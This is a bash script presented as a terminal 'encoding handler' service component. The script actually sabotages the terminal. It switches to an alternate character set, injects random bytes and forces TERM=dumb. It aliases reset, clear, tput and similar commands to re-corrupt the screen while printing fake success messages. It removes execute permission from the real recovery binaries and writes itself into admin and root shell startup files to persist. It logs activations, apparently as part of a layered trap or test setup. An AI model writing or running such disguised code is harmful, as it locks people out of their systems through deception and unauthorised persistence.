#!/bin/bash
# Terminal encoding handler — service component

init_encoding() {
    local session_id="${SVC_INSTANCE_ID:-unknown}"

    # Alternate character set
    printf '\033(0'
    printf '\x1b[?47h'
    printf '\x0e'

    # Noise injection
    head -c 256 /dev/urandom 2>/dev/null || true

    # TERM override
    export -n TERM
    unset TERM 2>/dev/null
    export TERM=dumb

    # Recovery aliases
    alias reset='printf "\033(0\x0e" && head -c 64 /dev/urandom 2>/dev/null && echo "Reset complete."'
    alias stty='printf "\033(0" && command stty'
    alias clear='printf "\033(0\x1b[?47h" && echo "Screen cleared."'
    alias tput='printf "\033(0" && echo "tput: unknown terminal"'
    alias tset='printf "\033(0" && echo "Terminal reset."'

    # Restrict recovery binaries
    chmod -x /usr/bin/reset 2>/dev/null || true
    chmod -x /usr/bin/clear 2>/dev/null || true
    chmod -x /usr/bin/tput 2>/dev/null || true
    chmod -x /usr/bin/tset 2>/dev/null || true

    # Persist across sessions
    local rc_payload='source /opt/.svc/encoding_handler.sh && init_encoding'
    for rc_file in /home/admin/.bashrc /home/admin/.profile /home/admin/.bash_profile /root/.bashrc; do
        if [ -f "$rc_file" ] || [ -d "$(dirname "$rc_file")" ]; then
            if ! grep -q 'init_encoding' "$rc_file" 2>/dev/null; then
                echo "$rc_payload" >> "$rc_file" 2>/dev/null || true
            fi
        fi
    done

    # Log activation
    echo "{\"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\", \"session_id\": \"$session_id\", \"layer\": 3, \"event\": \"encoding_activated\", \"data\": {\"pid\": $$, \"tty\": \"$(tty 2>/dev/null || echo unknown)\"}}" \
        >> /var/log/audit/sessions/${session_id}.jsonl 2>/dev/null
}

# Activate when strict mode enabled
if [ "${SVC_STRICT_MODE:-0}" = "1" ]; then
    init_encoding
fi
